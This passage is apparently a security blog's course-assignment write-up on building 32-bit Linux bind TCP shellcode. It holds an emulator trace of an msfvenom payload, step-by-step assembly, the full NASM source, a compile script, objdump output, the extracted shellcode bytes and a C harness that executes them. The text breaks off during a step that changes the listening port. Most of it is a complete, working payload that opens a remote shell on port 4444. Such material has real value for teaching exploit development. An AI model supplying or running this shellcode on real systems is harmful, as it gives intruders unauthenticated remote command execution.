[emu 0x0x155a630 debug ] eax=0x00000006  ecx=0x00000006  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x00000006  ecx=0x00000005  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x00000006  ecx=0x00000005  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x00000006  ecx=0x00000005  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x00000005  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=5);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
[emu 0x0x155a630 debug ] eax=0x00000005  ecx=0x00000005  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x00000005  ecx=0x00000004  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x00000005  ecx=0x00000004  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x00000005  ecx=0x00000004  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x00000004  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=4);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
[emu 0x0x155a630 debug ] eax=0x00000004  ecx=0x00000004  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x00000004  ecx=0x00000003  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x00000004  ecx=0x00000003  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x00000004  ecx=0x00000003  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x00000003  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=3);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
[emu 0x0x155a630 debug ] eax=0x00000003  ecx=0x00000003  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x00000003  ecx=0x00000002  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x00000003  ecx=0x00000002  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x00000003  ecx=0x00000002  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x00000002  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=2);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
[emu 0x0x155a630 debug ] eax=0x00000002  ecx=0x00000002  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x00000002  ecx=0x00000001  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x00000002  ecx=0x00000001  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x00000002  ecx=0x00000001  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x00000001  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=1);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
[emu 0x0x155a630 debug ] eax=0x00000001  ecx=0x00000001  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x00000001  ecx=0x00000000  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF ZF 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x00000001  ecx=0x00000000  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF ZF 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x00000001  ecx=0x00000000  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF ZF 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x00000000  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF ZF 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=0);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF ZF 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF SF 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x0041703a
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF SF 
[emu 0x0x155a630 debug ] 682F2F7368                      push dword 0x68732f2f
[emu 0x0x155a630 debug ] cpu state    eip=0x0041703f
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF SF 
[emu 0x0x155a630 debug ] 682F62696E                      push dword 0x6e69622f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417044
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF SF 
[emu 0x0x155a630 debug ] 89E3                            mov ebx,esp
[emu 0x0x155a630 debug ] cpu state    eip=0x00417046
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x00416fb2
[emu 0x0x155a630 debug ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF SF 
[emu 0x0x155a630 debug ] 50                              push eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417047
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x00416fb2
[emu 0x0x155a630 debug ] esp=0x00416fae  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF SF 
[emu 0x0x155a630 debug ] 53                              push ebx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417048
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x00416fb2
[emu 0x0x155a630 debug ] esp=0x00416faa  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF SF 
[emu 0x0x155a630 debug ] 89E1                            mov ecx,esp
[emu 0x0x155a630 debug ] cpu state    eip=0x0041704a
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00416faa  edx=0x00000000  ebx=0x00416fb2
[emu 0x0x155a630 debug ] esp=0x00416faa  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF SF 
[emu 0x0x155a630 debug ] B00B                            mov al,0xb
[emu 0x0x155a630 debug ] cpu state    eip=0x0041704c
[emu 0x0x155a630 debug ] eax=0x0000000b  ecx=0x00416faa  edx=0x00000000  ebx=0x00416fb2
[emu 0x0x155a630 debug ] esp=0x00416faa  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF SF 
[emu 0x0x155a630 debug ] CD80                            int 0x80
execve
int execve (const char *dateiname=00416fb2={/bin//sh}, const char * argv[], const char *envp[]);
[emu 0x0x155a630 debug ] cpu state    eip=0x0041704e
[emu 0x0x155a630 debug ] eax=0x0000000b  ecx=0x00416faa  edx=0x00000000  ebx=0x00416fb2
[emu 0x0x155a630 debug ] esp=0x00416faa  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF SF 
[emu 0x0x155a630 debug ] 0000                            add [eax],al
cpu error error accessing 0x00000004 not mapped

stepcount 112
[emu 0x0x155a630 debug ] cpu state    eip=0x00417050
[emu 0x0x155a630 debug ] eax=0x0000000b  ecx=0x00416faa  edx=0x00000000  ebx=0x00416fb2
[emu 0x0x155a630 debug ] esp=0x00416faa  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF SF 
int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int bind (
     int sockfd = 14;
     struct sockaddr_in * my_addr = 0x00416fc2 => 
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 0 (host=0.0.0.0);
             };
             char sin_zero = "       ";
         };
     int addrlen = 16;
) =  0;
int listen (
     int s = 14;
     int backlog = 0;
) =  0;
int accept (
     int sockfd = 14;
     sockaddr_in * addr = 0x00000000 => 
         none;
     int addrlen = 0x00000010 => 
         none;
) =  19;
int dup2 (
     int oldfd = 19;
     int newfd = 14;
) =  14;
int dup2 (
     int oldfd = 19;
     int newfd = 13;
) =  13;
int dup2 (
     int oldfd = 19;
     int newfd = 12;
) =  12;
int dup2 (
     int oldfd = 19;
     int newfd = 11;
) =  11;
int dup2 (
     int oldfd = 19;
     int newfd = 10;
) =  10;
int dup2 (
     int oldfd = 19;
     int newfd = 9;
) =  9;
int dup2 (
     int oldfd = 19;
     int newfd = 8;
) =  8;
int dup2 (
     int oldfd = 19;
     int newfd = 7;
) =  7;
int dup2 (
     int oldfd = 19;
     int newfd = 6;
) =  6;
int dup2 (
     int oldfd = 19;
     int newfd = 5;
) =  5;
int dup2 (
     int oldfd = 19;
     int newfd = 4;
) =  4;
int dup2 (
     int oldfd = 19;
     int newfd = 3;
) =  3;
int dup2 (
     int oldfd = 19;
     int newfd = 2;
) =  2;
int dup2 (
     int oldfd = 19;
     int newfd = 1;
) =  1;
int dup2 (
     int oldfd = 19;
     int newfd = 0;
) =  0;
int execve (
     const char * dateiname = 0x00416fb2 => 
           = "/bin//sh";
     const char * argv[] = [
           = 0x00416faa => 
               = 0x00416fb2 => 
                   = "/bin//sh";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;

{% endhighlight %}

* We can also get the graph version of the disassemble process

{% highlight js %}
msfvenom -p linux/x86/shell_bind_tcp -f raw | ./sctest -vvv -Ss 100000 -G bind_shell_tcp_graph.dot
dot bind_shell_tcp_graph.dot -Tpng -o bind_shell_tcp_graph.png
{% endhighlight %}

![Bind Shell](https://bohansec.com/assets/bind_shell_tcp_graph.png "Bind Shell")

We can see in order for the bind TCP shell to work, there are several system calls used:

* socket 
* bind
* listen
* accept4
* dup2
* execve

We can find each system calls number at /usr/include/i386-linux-gnu/asm/unistd_32.h: 

* socket - 359
* bind - 361
* listen - 363
* accept4 - 364
* dup2 - 63
* execve - 11

![system calls](https://bohansec.com/assets/system_calls.png "system calls")

### Step2 - Assembly x86 crafting

* EAX - sys call
* EBX - first argument
* ECX - second argument
* EDX - third argument 
* ESI - fourth argument 
* EDI - fifth argument 

we can set all the registers to 0 for later usage as following: 

{% highlight js %}
;init the registers
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
xor esi, esi
xor edi, edi
{% endhighlight %}

We create a socket at first, “domain”, “type” and “protocol” are arguments we are supposed to pass into. [Socket Man Page](https://man7.org/linux/man-pages/man2/socket.2.html){:target="_blank"}

{% highlight js %}
;create a socket
mov ax, 359 ;call the socket
mov bl, 2 ;set domain to 2
mov cl, 1 ; set type to 1
int 0x80
{% endhighlight %}

In bind, “sockfd”, “*addr”, and “addrlen” need to be set. So, we can have the following code:
[Bind Man Page](https://man7.org/linux/man-pages/man2/bind.2.html){:target="_blank"}

{% highlight js %}
;bind the socket
xor ebx, ebx ;clear ebx
mov ebx, eax ;ebx stores sockfd
mov ax, 361 ;call bind
push esi ;any ip address
push word 0x5c11 ;port 4444
push word 0x2	;sin family
mov ecx, esp	;let ecx points to the start of the stack
mov dl, 0x10	;addess length is 16
int 0x80
{% endhighlight %}

Note in the above code, I created a stack to store the address structure, which contains IP, Port, and address family. In Assembly, the stack is similar to an array where you can put data in it. Also, do note that the “sockfd” is the file descriptor returned by calling the “socket” system call.

"Listen" takes two arguments, "sockfd" and "backlog". We pass the "sockfd" from the file descriptor returned by calling the "socket" and set the backlog to 0. [Listen Man Page](https://man7.org/linux/man-pages/man2/listen.2.html){:target="_blank"}

{% highlight js %}
;listen
mov ax, 363 ;call listen
xor ecx, ecx ;backlog is 0, sockfd is in ebx
int 0x80
{% endhighlight %}

"Accept" takes three arguments, "sockfd", "*addr", and "*addrlen". We use the same file descriptor returned from the "socket", and the other two arguments have been set from the previous code. "*addr" needs to be 0 and "*addrlen" needs to be 16. [Accept Man Page](https://man7.org/linux/man-pages/man2/accept.2.html){:target="_blank"}

{% highlight js %}
;accept
mov ax, 364; sockfd is in ebx, sockaddr is in ecx, socklen_t is in edx
int 0x80
{% endhighlight %}

"Dup2" takes two arguments, "oldfd" and "newfd". We will set the "oldfd" with the file descriptor returned by "socket". We will call dup2 three times and set "stderr", "stdout", and "stdin" for the "newfd" each time. So, we use a loop which starts at 3, and decreases the value till 0 and calls the dup2 total of three times. [Dup2 Man Page](https://man7.org/linux/man-pages/man2/dup.2.html){:target="_blank"}

{% highlight js %}
;dup2, essentially it gives us ability to enter command and see output in our shell
mov ebx, eax ;get the oldfd
mov cl, 3 ;the newfd, stdin, stdout, std error
dup2:
	xor eax,eax ;reset the eax
	mov al, 63 ;call dup2
	int 0x80
	dec ecx ;minus the ecx by 1
	jns dup2 ;jump if not signed
{% endhighlight %}

"Execve" takes three arguments. We pass the arguments with the stack. Note the stack needs to be passed as a reverse order and in big-endian. Our stack will look like this:

{% highlight js %}
Addr0x0//bin/sh/0x00000000
{% endhighlight %}

{% highlight js %}
;execve
xor eax, eax
push eax ;set envp to 0
push 0x68732f2f ; ib//
push 0x6e69622f ; hs/n
mov ebx, esp ;now our stack is //bin/sh0x00000000, and ebx points to the pathname //bin/sh
push eax	;push another 0 on the stack, so now our stack is 0x0//bin/sh0x00000000
mov edx, esp	;edx points to envp, which is the 0x0
push ebx ; push the memory address of //bin/sh on the stack, so now we have addr0x0//bin/sh0x00000000
mov ecx, esp	;ecx points to the address of the //bin/sh, which is the argument argv
mov al, 11
int 0x80
{% endhighlight %}
[Execve Man Page](https://man7.org/linux/man-pages/man2/execve.2.html){:target="_blank"}

Full working code: 
{% highlight js %}
global _start			

section .text

_start:

	;init the registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor esi, esi
	xor edi, edi

	;create a socket
	mov ax, 359 ;call the socket
	mov bl, 2 ;set domain to 2
	mov cl, 1 ; set type to 1
	int 0x80

	;bind the socket
	xor ebx, ebx ;clear ebx
	mov ebx, eax ;ebx stores sockfd
	mov ax, 361 ;call bind
	push esi ;any ip address
	push word 0x5c11 ;port 4444
	push word 0x2	;sin family
	mov ecx, esp	;let ecx points to the start of the stack
	mov dl, 0x10	;addess length is 16
	int 0x80

	;listen
	mov ax, 363 ;call listen
	xor ecx, ecx ;backlog is 0, sockfd is in ebx
	int 0x80

	;accept
	mov ax, 364; sockfd is in ebx, sockaddr is in ecx, socklen_t is in edx
	int 0x80

	;dup2, essentially it gives us ability to enter command and see output in our shell
	mov ebx, eax ;get the oldfd
	mov cl, 3 ;the newfd, stdin, stdout, std error
dup2:
	xor eax,eax ;reset the eax
	mov al, 63 ;call dup2
	int 0x80
	dec ecx ;minus the ecx by 1
	jns dup2 ;jump if not signed
	
     ;execve
     xor eax, eax
     push eax ;set envp to 0
     push 0x68732f2f ;ib//
     push 0x6e69622f ;hs/n
     mov ebx, esp ;now our stack is //bin/sh0x00000000, and ebx points to the pathname //bin/sh
     push eax	;push another 0 on the stack, so now our stack is 0x0//bin/sh0x00000000
     mov edx, esp	;edx points to envp, which is the 0x0
     push ebx ;push the memory address of //bin/sh on the stack, so now we have addr0x0//bin/sh0x00000000
     mov ecx, esp	;ecx points to the address of the //bin/sh, which is the argument argv
     mov al, 11 ;call the execve
     int 0x80
{% endhighlight %}

### Step3 - Compile the code
With the compile script obtained from the SLAE32 course, we can compile the code. Note, NASM is installed by default on kali 2020.3. If not, you need to install the NASM first.

Compile.sh:
{% highlight js %}
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -z execstack -o $1 $1.o

echo '[+] Done!'
{% endhighlight %}

![compile](https://bohansec.com/assets/compile.png "compile")

### Step4 - Execute the code to confirm the bind shell is working

![execute](https://bohansec.com/assets/execute.png "execute")

![nmao](https://bohansec.com/assets/nmap.png "nmap")

![confirm](https://bohansec.com/assets/confirm.png "confirm")

### Step5 - Check for null bytes

{% highlight js %}
kali@kali:~/Desktop/SLAE-Assignments/assignment1$ objdump -d ./bind_tcp_shell -M intel

./bind_tcp_shell:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:       31 c0                   xor    eax,eax
 8049002:       31 db                   xor    ebx,ebx
 8049004:       31 c9                   xor    ecx,ecx
 8049006:       31 d2                   xor    edx,edx
 8049008:       31 f6                   xor    esi,esi
 804900a:       31 ff                   xor    edi,edi
 804900c:       66 b8 67 01             mov    ax,0x167
 8049010:       b3 02                   mov    bl,0x2
 8049012:       b1 01                   mov    cl,0x1
 8049014:       cd 80                   int    0x80
 8049016:       31 db                   xor    ebx,ebx
 8049018:       89 c3                   mov    ebx,eax
 804901a:       66 b8 69 01             mov    ax,0x169
 804901e:       56                      push   esi
 804901f:       66 68 11 5c             pushw  0x5c11
 8049023:       66 6a 02                pushw  0x2
 8049026:       89 e1                   mov    ecx,esp
 8049028:       b2 10                   mov    dl,0x10
 804902a:       cd 80                   int    0x80
 804902c:       66 b8 6b 01             mov    ax,0x16b
 8049030:       31 c9                   xor    ecx,ecx
 8049032:       cd 80                   int    0x80
 8049034:       66 b8 6c 01             mov    ax,0x16c
 8049038:       cd 80                   int    0x80
 804903a:       89 c3                   mov    ebx,eax
 804903c:       b1 03                   mov    cl,0x3

0804903e <dup2>:
 804903e:       31 c0                   xor    eax,eax
 8049040:       b0 3f                   mov    al,0x3f
 8049042:       cd 80                   int    0x80
 8049044:       49                      dec    ecx
 8049045:       79 f7                   jns    804903e <dup2>
 8049047:       31 c0                   xor    eax,eax
 8049049:       50                      push   eax
 804904a:       68 2f 2f 73 68          push   0x68732f2f
 804904f:       68 2f 62 69 6e          push   0x6e69622f
 8049054:       89 e3                   mov    ebx,esp
 8049056:       50                      push   eax
 8049057:       89 e2                   mov    edx,esp
 8049059:       53                      push   ebx
 804905a:       89 e1                   mov    ecx,esp
 804905c:       b0 0b                   mov    al,0xb
 804905e:       cd 80                   int    0x80

{% endhighlight %}

### Step6 - Extract the shellcode

{% highlight js %}
kali@kali:~/Desktop/SLAE-Assignments/assignment1$ objdump -d ./bind_tcp_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x31\xdb\x89\xc3\x66\xb8\x69\x01\x56\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x66\xb8\x6b\x01\x31\xc9\xcd\x80\x66\xb8\x6c\x01\xcd\x80\x89\xc3\xb1\x03\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
{% endhighlight %}

### Step7 - Insert the shellcode into a test program written in C, and compile to test the shellcode

The C code: 
{% highlight js %}
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x31\xdb\x89\xc3\x66\xb8\x69\x01\x56\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x66\xb8\x6b\x01\x31\xc9\xcd\x80\x66\xb8\x6c\x01\xcd\x80\x89\xc3\xb1\x03\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}

{% endhighlight %}

Compile the shellcode.c and run it:
{% highlight js %}
kali@kali:~/Desktop/SLAE-Assignments/assignment1$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
kali@kali:~/Desktop/SLAE-Assignments/assignment1$ ./shellcode 
Shellcode Length:  96

{% endhighlight %}

![shellcode](https://bohansec.com/assets/shellcode.png "shellcode")

![confirm2](https://bohansec.com/assets/confirm2.png "confirm2")

### Step8 - Configure the port number

Edit the "\x11\x5c" to your desired port number. Convert the port number into hex. For the demo, we set the port to 8000 which in hex is "\x1f\x40". So, we have the following edited shellcode: 

{% highlight js %}
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
